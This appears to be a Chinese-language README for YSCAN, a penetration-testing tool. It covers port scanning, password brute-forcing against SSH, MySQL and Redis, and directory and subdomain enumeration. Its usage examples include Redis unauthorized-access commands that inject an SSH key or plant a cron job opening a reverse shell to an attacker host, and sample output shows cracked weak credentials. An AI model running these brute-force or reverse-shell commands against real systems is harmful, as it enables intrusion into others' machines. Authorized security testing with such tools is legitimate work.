# ⚡ YSCAN — 渗透测试利刃，一秒出活

<p align="center">
  <strong>轻量 · 高速 · 现代终端 · 结果持久化</strong>
</p>

---

## 🔥 为什么要用 YSCAN？

内网渗透最烦什么？**工具散、界面丑、扫完没记录**。

YSCAN 把 **8 项核心能力** 集成到一个命令里：

| 能力 | 命令 | 一句话 |
|------|------|--------|
| 🔌 端口扫描 | `port` | 异步 TCP Connect，Top100 端口 1 秒出结果 |
| 🎯 一键扫描 | `scan` | 端口→弱口令全自动，发现 SSH/MySQL/Redis 立即爆破 |
| 🔑 SSH 爆破 | `ssh` | Paramiko 驱动，500 线程并发 |
| 🗄️ MySQL 爆破 | `mysql` | 爆出版本号，方便后续利用 |
| 🔴 Redis 爆破 | `redis` | 自动检测写入条件 + 公私钥注入 + cron 反弹 |
| 🌐 目录扫描 | `dir` | 9645 条路径字典，状态码分色，响应大小一目了然 |
| 🌍 子域名爆破 | `subdomain` | 10000 条字典，DNS A 记录解析 |
| 📡 IP 存活探测 | `ip` | ICMP ping，Windows/Linux/macOS 全平台通用 |

**所有命令支持 `-o` 输出 HTML/TXT 报告。**

---

## 🎨 终端效果

YSCAN 基于 **Rich** 构建现代化终端 UI，**alive-progress** 提供炫酷单行动态进度条：

```
┌── YSCAN 一键扫描 ──┐
│ 主机数    254       │
│ 端口数    100 (Top) │
│ 总任务    25,400    │
└─ 不执行目录扫描和 ─┘

▸ 192.168.88.188
    22/tcp  SSH
  3306/tcp  MySQL
  6379/tcp  Redis

▸ 192.168.88.1
  3306/tcp  MySQL

───────────────── 弱口令检测 ─────────────────

192.168.88.188
  → SSH 弱口令检测
    ✔ SSH   192.168.88.188:22 → root/123456
  → MySQL 弱口令检测
    ✔ MySQL 192.168.88.188:3306 → root/xxx (8.0.46)
  → Redis 弱口令检测
    ✔ Redis 192.168.88.188:6379 → 123456

┌───────────────── 扫描汇总 ─────────────────┐
│   扫描主机    254                           │
│   存活主机      2                           │
│   开放端口      8                           │
└─────────────────────────────────────────────┘
```

- 🟢 绿色 = 成功/存活 | 🔵 蓝色 = 信息 | 🔴 红色 = 失败 | 🟡 黄色 = 警告 | 🟣 紫色 = 服务名

---

## 📦 安装指南

```bash
# 1. 克隆项目
git clone https://github.com/your/YSCAN.git && cd YSCAN

# 2. 创建虚拟环境
python -m venv .venv

# 3. 激活虚拟环境
# Linux / macOS:
source .venv/bin/activate
# Windows:
.venv\Scripts\activate

# 4. 安装依赖（华为云镜像，国内秒装，华为不卡）
pip install -i https://mirrors.huaweicloud.com/repository/pypi/simple -r requirements.txt
```

| 依赖 | 版本 | 用途 |
|------|:---:|------|
| `alive-progress` | ≥3.3 | 炫酷单行动态进度条 |
| `rich` | ≥13 | 现代化终端 UI（颜色/面板/表格） |
| `paramiko` | ≥3 | SSH 连接与弱口令检测 |
| `PyMySQL` | ≥1 | MySQL 连接与弱口令检测 |
| `redis` | ≥5 | Redis 连接与弱口令检测 |
| `requests` | ≥2.28 | HTTP 目录扫描 |
| `dnspython` | ≥2.3 | DNS 子域名枚举 |

> **最低 Python 版本要求：3.9+**

---

## 🚀 完全使用指南

### 1. 一键扫描 `scan` — 端口 + 弱口令全自动

最常用命令。输入网段，自动完成端口扫描 → 弱口令检测全流程。

```bash
# 基础：扫描 /24 网段，Top100 端口 + SSH/MySQL/Redis 弱口令
python yscan.py scan -H 192.168.1.0/24

# 指定用户名和密码本
python yscan.py scan -H 192.168.1.0/24 -u admin -p libs/passwords.txt

# 只扫描 Top 50 端口（更快）
python yscan.py scan -H 10.0.0.0/24 --top 50

# 调高并发加速（默认 500）
python yscan.py scan -H 172.16.0.0/16 -T 1000 --top 30

# 输出 HTML 报告，浏览器打开看
python yscan.py scan -H 192.168.1.0/24 -o result.html

# 输出 TXT 纯文本，方便 grep 二次处理
python yscan.py scan -H 192.168.1.0/24 -o result.txt
```

> **参数全览**：`-H` 网段（必填） · `-u` 用户名 · `-p` 密码本路径 · `--top` Top端口数 · `-T` 线程数 · `-o` 输出文件

---

### 2. 端口扫描 `port` — 比 nmap 轻，比 telnet 快

```bash
# 默认 Top100 端口（不需要任何参数）
python yscan.py port -H 192.168.1.1

# 指定 Top N
python yscan.py port -H 192.168.1.1 --top 50

# 自定义端口范围
python yscan.py port -H 192.168.1.1 -p 1-1024
python yscan.py port -H 192.168.1.1 -p 22,80,443,3306,6379,8080

# 输出结果
python yscan.py port -H 192.168.1.0/24 -p 22,80,443 -o ports.html
```

> **参数全览**：`-H` IP地址（必填） · `--top` Top端口数 · `-p` 端口范围/列表 · `-T` 线程数 · `-o` 输出文件

---

### 3. SSH 弱口令检测 `ssh`

```bash
# 基础：指定网段，用 root + 默认密码本爆破
python yscan.py ssh -H 192.168.1.0/24

# 指定用户名 + 自定义密码本
python yscan.py ssh -H 10.0.0.0/24 -u admin -p my_passwords.txt

# 指定用户名 + 指定端口
python yscan.py ssh -H 192.168.1.1 -u root -p libs/passwords.txt -P 2222

# 用户名文件模式 — 多个用户名 × 密码本笛卡尔积
python yscan.py ssh -H 192.168.1.0/24 -U libs/users.txt -p libs/passwords.txt
```

> **参数全览**：`-H` 网段（必填） · `-u` 用户名 · `-U` 用户名文件 · `-p` 密码本 · `-P` 端口 · `-T` 线程数 · `-o` 输出文件

---

### 4. MySQL 弱口令检测 `mysql`

```bash
# 基础：root + 默认密码本
python yscan.py mysql -H 192.168.1.0/24

# 指定用户名 + 自定义密码本 + 自定义端口
python yscan.py mysql -H 192.168.1.1 -u admin -p my_pass.txt -P 3307

# 用户名文件模式
python yscan.py mysql -H 192.168.1.0/24 -U libs/users.txt -p libs/passwords.txt

# 单主机 + 保存结果
python yscan.py mysql -H 192.168.1.1 -u root -p libs/passwords.txt -o mysql.html
```

> **参数全览**：`-H` 网段（必填） · `-u` 用户名 · `-U` 用户名文件 · `-p` 密码本 · `-P` 端口 · `-T` 线程数 · `-o` 输出文件

---

### 5. Redis 弱口令检测 `redis` — 含未授权利用

```bash
# 基础：默认密码本爆破
python yscan.py redis -H 192.168.1.0/24

# 指定密码本 + 非默认端口
python yscan.py redis -H 10.0.0.1 -p libs/passwords.txt -P 6380

# 未授权利用 — 写入 SSH 公钥
python yscan.py redis -H 10.0.0.1 -pub ~/.ssh/id_rsa.pub

# 未授权利用 — 写入 cron 定时任务反弹 shell
python yscan.py redis -H 10.0.0.1 -I 192.168.1.100 -L 4444

# 全参数组合
python yscan.py redis -H 10.0.0.1 -p my_pass.txt -pub id_rsa.pub -I 10.0.0.2 -L 8888
```

> **参数全览**：`-H` 网段（必填） · `-p` 密码本 · `-P` 端口 · `-pub` SSH公钥文件 · `-I` 反弹IP · `-L` 反弹端口 · `-T` 线程数 · `-o` 输出文件

---

### 6. Web 目录扫描 `dir`

```bash
# 基础：默认超时 3s，9645 条路径字典
python yscan.py dir -t http://192.168.1.1/

# HTTPS 目标
python yscan.py dir -t https://example.com/

# 内网低延迟 — 拉高并发 + 压低超时
python yscan.py dir -t http://192.168.1.1/ -T 1000 --timeout 1

# 外网高延迟 — 适中并发 + 长超时
python yscan.py dir -t http://example.com/ -T 200 --timeout 5

# 输出结果
python yscan.py dir -t http://192.168.1.1/ -o dir_result.html
```

> **参数全览**：`-t` 目标URL（必填） · `-T` 线程数 · `--timeout` 单请求超时秒数 · `-o` 输出文件

---

### 7. 子域名爆破 `subdomain`

```bash
# 基础：10000 条子域名字典
python yscan.py subdomain -t baidu.com

# 调高并发
python yscan.py subdomain -t example.com -T 500

# 输出结果
python yscan.py subdomain -t target.com -o subs.html
```

> **参数全览**：`-t` 目标域名（必填） · `-T` 线程数 · `-o` 输出文件

---

### 8. IP 存活探测 `ip`

```bash
# 单 IP 或网段
python yscan.py ip -H 192.168.1.1
python yscan.py ip -H 192.168.1.0/24

# 范围格式
python yscan.py ip -H 192.168.1.1-192.168.1.254

# 调高并发加速
python yscan.py ip -H 10.0.0.0/16 -T 1000

# 输出结果
python yscan.py ip -H 192.168.1.0/24 -o alive_hosts.txt
```

> **参数全览**：`-H` IP/网段/范围（必填） · `-T` 线程数 · `-o` 输出文件

---

### 自定义字典

内置字典在 `libs/` 目录，你可以直接替换或指定自己的：

```bash
# 用自定义密码本
python yscan.py ssh -H 10.0.0.0/24 -u root -p /path/to/top1000.txt

# 用自定义用户名文件
python yscan.py ssh -H 10.0.0.0/24 -U /path/to/users.txt -p libs/passwords.txt

# 字典文件格式：一行一个
# cat my_pass.txt
#   123456
#   admin
#   password
#   root
```

### 结果保存

所有 8 个子命令都支持 `-o` 参数：

```bash
# .html → 暗色 GitHub 风格 HTML 报告，成功/失败/警告自动着色
python yscan.py scan -H 192.168.1.0/24 -o report.html

# .txt → 纯文本，自动去除 ANSI 颜色码，适合 grep/awk
python yscan.py port -H 10.0.0.1 -p 1-1024 -o ports.txt
```

---

## 🧠 设计哲学

### 一键扫描的"智能检测链"

```
用户输入网段
    │
    ▼
┌─────────────┐
│ 端口扫描    │ ← async + alive-progress 实时进度
│ 100 端口    │   发现开放端口立即流式输出
└─────┬───────┘
      │ 发现 22/3306/6379
      ▼
┌─────────────┐
│ 弱口令检测  │ ← 按主机逐个触发
│ SSH/MySQL/  │   每台主机只尝试相关服务
│ Redis       │   命中一台即跳过后续尝试
└─────────────┘
      │
      ▼
┌─────────────┐
│ 汇总报告    │ ← Panel 表格 + 可选 HTML/TXT 输出
└─────────────┘
```

### 核心优势

| 特性 | 实现 |
|------|------|
| ⚡ 异步端口扫描 | `asyncio` + 500 并发，25400 任务 51s 完成 |
| 🔄 实时流式输出 | 发现开放端口立即打印，不等到全部扫完 |
| 🎯 智能触发 | 只有 22/3306/6379 开放才触发对应弱口令模块 |
| 📊 动态进度条 | `alive-progress` 单行刷新，始终钉在终端底部 |
| 📝 结果持久化 | `-o` 一键生成 HTML（暗色主题）或 TXT 报告 |
| 🌍 跨平台 | IP 存活探测自动适配 Windows/Linux/macOS ping |
| 🔐 安全设计 | `shell=False` 杜绝命令注入，无 eval 执行 |

### 字典库规模

| 字典 | 条目数 | 用途 |
|------|:---:|------|
| `passwords.txt` | 947 | 弱口令爆破 |
| `users.txt` | 8,885 | 用户名字典 |
| `dirpath.txt` | 9,645 | Web 目录扫描 |
| `subdomain.txt` | 9,999 | 子域名枚举 |

---

## 📂 项目结构

```text
YSCAN/
├── yscan.py              # CLI 入口，argparse 路由
├── tools/
│   ├── scan_run.py       # 一键扫描编排引擎
│   ├── tcp_port_scan.py  # asyncio TCP 端口扫描 + PORT_SERVICE 映射表
│   ├── ssh_burte.py      # SSH 弱口令（Paramiko）
│   ├── mysql_burte.py    # MySQL 弱口令（PyMySQL）
│   ├── redis_burte.py    # Redis 弱口令 + 未授权利用（公私钥/cron）
│   ├── dir_scan.py       # Web 目录爆破（requests + Session 复用）
│   ├── subdomain_scan.py # DNS 子域名枚举（dnspython）
│   ├── ip_scan.py        # ICMP 存活探测（跨平台）
│   ├── AddressTools.py   # CIDR/网段/IP范围 解析器
│   ├── PortTools.py      # 端口表达式解析器
│   ├── WordlistTools.py  # 字典去重加载器
│   ├── SchedulerTools.py # ThreadPoolExecutor 调度器
│   ├── OutputTools.py    # TeeWriter — TXT/HTML 报告生成
│   ├── color.py          # Rich Console + ANSI Colors 常量
│   └── __init__.py
├── libs/
│   ├── passwords.txt     # 947 条密码
│   ├── users.txt         # 8,885 条用户名
│   ├── dirpath.txt       # 9,645 条 Web 路径
│   └── subdomain.txt     # 9,999 条子域名词
└── README.md
```

---

## 📊 性能基准

> 测试环境：Windows 11, Python 3.14, 目标 `/24` 网段

| 场景 | 任务数 | 线程 | 耗时    |
|------|:---:|:---:|-------|
| `/24` 网段一键扫描 (Top100) | 25,400 | 500 | ~21s  |
| 单主机 Top100 端口 | 100 | 200 | ~1s   |
| 子域名爆破 10000 条 | 10,000 | 300 | ~28s  |
| 目录扫描 9645 条 | 9,645 | 500 | ~15s* |

>\* 取决于目标响应速度和 `--timeout` 设置

---

## ⚠️ 免责声明

**YSCAN 仅供授权的安全测试、应急响应和教育研究使用。**

使用本工具进行任何未经授权的渗透测试、漏洞扫描或弱口令爆破均属违法行为。使用者应自行承担所有法律后果，作者不对任何滥用行为负责。

---

## 📄 License

MIT © moresuo

---

<p align="center">
  <strong>⚡ 渗透测试，一秒出活 — 试试 YSCAN 吧</strong>
</p>
